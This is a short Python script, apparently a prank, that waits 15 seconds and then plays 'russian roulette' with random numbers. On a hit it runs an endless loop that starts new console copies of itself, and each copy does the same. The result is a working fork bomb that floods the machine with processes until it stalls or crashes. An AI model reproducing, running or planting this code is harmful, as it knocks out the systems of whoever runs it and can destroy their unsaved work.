import os
import sys
from time import sleep
import random
import subprocess

#Number to guess before roulette is called 
ROULETTE = 4


#Delay execution of roulette by x seconds
DELAY = 15
def rick_bomb():
        while True:
            subprocess.Popen([sys.executable, sys.argv[0]], creationflags=subprocess.CREATE_NEW_CONSOLE)
        
def russian_roulette():
    num = random.randint(0, 5)
    print(num)
    if ROULETTE == num:
        print("!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!HIT NUMBER!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!")
        rick_bomb()
        return True
    else: return False
    
    
if __name__=="__main__":
    sleep(DELAY)
    while True:
        sleep(.33)
        if russian_roulette():
            break


